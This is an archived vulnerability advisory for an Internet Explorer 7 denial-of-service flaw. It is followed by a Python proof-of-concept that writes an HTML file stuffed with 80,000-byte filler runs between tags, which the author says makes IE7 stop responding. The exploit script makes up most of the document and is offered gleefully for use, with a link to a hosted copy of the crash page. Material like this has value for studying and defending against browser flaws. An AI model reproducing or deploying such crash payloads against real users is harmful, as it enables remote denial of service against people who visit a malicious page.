source: http://www.securityfocus.com/bid/23178/info

Microsoft Internet Explorer is prone to a denial-of-service vulnerability because the application fails to handle exceptional conditions.

This issue is triggered when an attacker entices a victim user to visit a malicious website.

Remote attackers may exploit this issue to crash Internet Explorer, effectively denying service to legitimate users.

This issue affects Internet Explorer version 7. 

# usr/bin/python

print "-------------------------------------------------------------------------"
print " Internet Explorer 7.0.5730.11 Denial of Service"
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://shinnai.altervista.org\n"
print " For convenience I post up a script in python that create a .html file"
print " You can open it locally, upload and browse it or directely browse here:\n"
print " http://www.shinnai.altervista.org/ie_dos.html\n"
print " About 60 seconds and IE7 stops to answer :)"
print "-------------------------------------------------------------------------"

tagHtml = "<html>"
tagHtmlC = "</html>"
tagHead = "<head>"
tagHeadC = "</head>"
tagTitle = "<title>"
tagTitleC = "</title>"

buff= "\x90" * 80000

boom = tagHtml + buff  + tagHead + buff + tagTitle + buff + tagTitleC + tagHeadC + tagHtmlC

try:
   fileOut = open('ie_dos.html','w')
   fileOut.write(boom)
   fileOut.close()
   print "\nFILE CREATED!\n'NJOY IT...\n"
except:
   print "\nUNABLE TO CREATE FILE!\n"

